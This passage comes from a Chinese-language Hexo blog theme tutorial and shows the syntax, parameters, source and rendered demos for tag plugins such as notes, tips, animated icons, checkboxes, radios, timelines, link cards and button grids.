fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding modern"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>3.<code>flat</code>样式</p><div class="note icon-padding flat"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding flat"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding flat"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>4.<code>disabled</code>样式</p><div class="note icon-padding disabled"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding disabled"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding disabled"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding disabled"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding disabled"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding disabled"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding disabled"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>5.<code>no-icon</code>样式</p><div class="note no-icon flat"><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue no-icon flat"><p>2021年快到了…</p></div><div class="note pink no-icon flat"><p>小心开车 安全至上</p></div><div class="note red no-icon flat"><p>这是三片呢？还是四片？</p></div><div class="note orange no-icon flat"><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple no-icon flat"><p>剪刀石头布</p></div><div class="note green no-icon flat"><p>前端最讨厌的浏览器</p></div>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-5-上标标签-tip">2.5 上标标签 tip</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip [参数，可选] %&#125;文本内容&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>样式</code>: success,error,warning,bolt,ban,home,sync,cogs,key,bell</li><li><code>自定义图标</code>: 支持fontawesome。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip %&#125;default&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip info %&#125;info&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip success %&#125;success&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip error %&#125;error&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip warning %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bolt %&#125;bolt&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban %&#125;ban&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip home %&#125;home&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip sync %&#125;sync&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip cogs %&#125;cogs&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip key %&#125;key&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bell %&#125;bell&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip fa-atom %&#125;自定义font awesome图标&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="tip "><p>default</p></div><div class="tip info"><p>info</p></div><div class="tip success"><p>success</p></div><div class="tip error"><p>error</p></div><div class="tip warning"><p>warning</p></div><div class="tip bolt"><p>bolt</p></div><div class="tip ban"><p>ban</p></div><div class="tip home"><p>home</p></div><div class="tip sync"><p>sync</p></div><div class="tip cogs"><p>cogs</p></div><div class="tip key"><p>key</p></div><div class="tip bell"><p>bell</p></div><div class="tip fa-atom"><p>自定义font awesome图标</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-6-动态标签-anima">2.6 动态标签 anima</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip [参数，可选] %&#125;文本内容&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><div class="note info flat"><ol><li>将所需的CSS类添加到图标（或DOM中的任何元素）。</li><li>对于父级悬停样式，需要给目标元素添加指定CSS类，同时还要给目标元素的父级元素添加CSS类<code>faa-parent animated-hover</code>。（详情见示例及示例源码）<br>You can regulate the speed of the animation by adding the CSS class or . faa-fastfaa-slow</li><li>可以通过给目标元素添加CSS类<code>faa-fast</code>或<code>faa-slow</code>来控制动画快慢。</li></ol></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.On DOM load（当页面加载时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>2.调整动画速度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated faa-fast %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated faa-slow %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>3.On hover（当鼠标悬停时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated-hover %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated-hover %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>4.On parent hover（当鼠标悬停在父级元素时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-parent animated-hover %&#125;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-horizontal&quot;</span>&gt;</span></span>warning<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-parent animated-hover %&#125;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-flash&quot;</span>&gt;</span></span>ban<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.On DOM load（当页面加载时显示动画）</p><div class="tip warning faa-horizontal animated"><p>warning</p></div><div class="tip ban faa-flash animated"><p>ban</p></div>2.调整动画速度<div class="tip warning faa-horizontal animated faa-fast"><p>warning</p></div><div class="tip ban faa-flash animated faa-slow"><p>ban</p></div>3.On hover（当鼠标悬停时显示动画）<div class="tip warning faa-horizontal animated-hover"><p>warning</p></div><div class="tip ban faa-flash animated-hover"><p>ban</p></div>4.On parent hover（当鼠标悬停在父级元素时显示动画）<div class="tip warning faa-parent animated-hover"><p class="faa-horizontal">warning</p></div><div class="tip ban faa-parent animated-hover"><p class="faa-flash">ban</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-7-复选列表-checkbox">2.7 复选列表 checkbox</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>样式</code>: plus, minus, times</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>选中状态</code>: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 纯文本测试 %&#125;</span><br><span class="line">&#123;% checkbox checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% checkbox red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% checkbox green checked, 绿色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox yellow checked, 黄色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox cyan checked, 青色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox blue checked, 蓝色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox plus green checked, 增加 %&#125;</span><br><span class="line">&#123;% checkbox minus yellow checked, 减少 %&#125;</span><br><span class="line">&#123;% checkbox times red checked, 叉 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class='checkbox'><input type="checkbox" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="checkbox" />            <p>支持自定义颜色</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>绿色 + 默认选中</p>            </div><div class='checkbox yellow checked'><input type="checkbox" checked="checked"/>            <p>黄色 + 默认选中</p>            </div><div class='checkbox cyan checked'><input type="checkbox" checked="checked"/>            <p>青色 + 默认选中</p>            </div><div class='checkbox blue checked'><input type="checkbox" checked="checked"/>            <p>蓝色 + 默认选中</p>            </div><div class='checkbox plus green checked'><input type="checkbox" checked="checked"/>            <p>增加</p>            </div><div class='checkbox minus yellow checked'><input type="checkbox" checked="checked"/>            <p>减少</p>            </div><div class='checkbox times red checked'><input type="checkbox" checked="checked"/>            <p>叉</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-8-单选列表-radio">2.8 单选列表 radio</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% radio 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>选中状态</code>: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% radio 纯文本测试 %&#125;</span><br><span class="line">&#123;% radio checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% radio red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% radio green, 绿色 %&#125;</span><br><span class="line">&#123;% radio yellow, 黄色 %&#125;</span><br><span class="line">&#123;% radio cyan, 青色 %&#125;</span><br><span class="line">&#123;% radio blue, 蓝色 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class='checkbox'><input type="radio" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="radio" />            <p>支持自定义颜色</p>            </div><div class='checkbox green'><input type="radio" />            <p>绿色</p>            </div><div class='checkbox yellow'><input type="radio" />            <p>黄色</p>            </div><div class='checkbox cyan'><input type="radio" />            <p>青色</p>            </div><div class='checkbox blue'><input type="radio" />            <p>蓝色</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-9-时间轴-timeline">2.9 时间轴 timeline</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline 时间线标题（可选）[,color] %&#125;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>title</code>:标题/时间线</li><li><code>color</code>:<code>timeline</code>颜色:default(留空) / blue / pink / red / purple / orange / green</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline 时间轴样式,blue %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-07-24 [<span class="string">2.6.6 -&gt; 3.0</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases</span>) --&gt;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 如果有 <span class="code">`hexo-lazyload-image`</span> 插件，需要删除并重新安装最新版本，设置 <span class="code">`lazyload.isSPA: true`</span>。</span><br><span class="line"><span class="bullet">2.</span> 2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <span class="code">`use_cdn: true`</span> 则需要删除。</span><br><span class="line"><span class="bullet">3.</span> 2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</span><br><span class="line"><span class="bullet">4.</span> 2.x 版本的置顶 <span class="code">`top: true`</span> 改为了 <span class="code">`pin: true`</span>，并且同样适用于 <span class="code">`layout: page`</span> 的页面。</span><br><span class="line"><span class="bullet">5.</span> 如果使用了 <span class="code">`hexo-offline`</span> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-05-15 [<span class="string">2.6.3 -&gt; 2.6.6</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6</span>) --&gt;</span><br><span class="line"></span><br><span class="line">不需要额外处理。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-04-20 [<span class="string">2.6.2 -&gt; 2.6.3</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3</span>) --&gt;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 全局搜索 <span class="code">`seotitle`</span> 并替换为 <span class="code">`seo_title`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的索引规则有变，使用 group 组件的文章内，<span class="code">`group: group_name`</span> 对应的组件名必须是 <span class="code">`group_name`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的列表名优先显示文章的 <span class="code">`short_title`</span> 其次是 <span class="code">`title`</span>。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>时间轴样式</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-07-24 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases">2.6.6 -&gt; 3.0</a></p></div></div><div class='timeline-item-content'><ol><li>如果有 <code>hexo-lazyload-image</code> 插件，需要删除并重新安装最新版本，设置 <code>lazyload.isSPA: true</code>。</li><li>2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <code>use_cdn: true</code> 则需要删除。</li><li>2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</li><li>2.x 版本的置顶 <code>top: true</code> 改为了 <code>pin: true</code>，并且同样适用于 <code>layout: page</code> 的页面。</li><li>如果使用了 <code>hexo-offline</code> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</li></ol></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-05-15 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6">2.6.3 -&gt; 2.6.6</a></p></div></div><div class='timeline-item-content'><p>不需要额外处理。</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-04-20 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3">2.6.2 -&gt; 2.6.3</a></p></div></div><div class='timeline-item-content'><ol><li>全局搜索 <code>seotitle</code> 并替换为 <code>seo_title</code>。</li><li>group 组件的索引规则有变，使用 group 组件的文章内，<code>group: group_name</code> 对应的组件名必须是 <code>group_name</code>。</li><li>group 组件的列表名优先显示文章的 <code>short_title</code> 其次是 <code>title</code>。</li></ol></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-10-链接卡片-link">2.10 链接卡片 link</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link 标题, 链接, 图片链接（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link 糖果屋教程贴, https://akilar.top/posts/615e2dec/, https://cdn.cbd.int/akilar-candyassets@1.0.36/image/siteicon/favicon.ico %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="tag link"><a class="link-card" title="糖果屋教程贴" href="https://akilar.top/posts/615e2dec/"><div class="left"><img src="https://cdn.cbd.int/akilar-candyassets@1.0.36/image/siteicon/favicon.ico"/></div><div class="right"><p class="text">糖果屋教程贴</p><p class="url">https://akilar.top/posts/615e2dec/</p></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-11-按钮-btns">2.11 按钮 btns</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns 样式参数 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>圆角样式：rounded, circle</li><li>增加文字样式：可以在容器内增加 <code>&lt;b&gt;</code>标题<code>&lt;/b&gt;</code>和<code>&lt;p&gt;</code>描述文字<code>&lt;/p&gt;</code></li><li>布局方式：<br>默认为自动宽度，适合视野内只有一两个的情况。</li></ol><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>wide</td><td>宽一点的按钮</td></tr><tr><td>fill</td><td>填充布局，自动铺满至少一行，多了会换行</td></tr><tr><td>center</td><td>居中，按钮之间是固定间距</td></tr><tr><td>around</td><td>居中分散</td></tr><tr><td>grid2</td><td>等宽最多2列，屏幕变窄会适当减少列数</td></tr><tr><td>grid3</td><td>等宽最多3列，屏幕变窄会适当减少列数</td></tr><tr><td>grid4</td><td>等宽最多4列，屏幕变窄会适当减少列数</td></tr><tr><td>grid5</td><td>等宽最多5列，屏幕变窄会适当减少列数</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.如果需要显示类似「团队成员」之类的一组含有头像的链接</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle grid5 %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>2.或者含有图标的按钮</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns rounded grid5 %&#125;</span><br><span class="line">&#123;% cell 下载源码, /, fas fa-download %&#125;</span><br><span class="line">&#123;% cell 查看文档, /, fas fa-book-open %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>3.圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle center grid5 %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="language-xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p red, 专业版 %&#125;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_pro.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"> 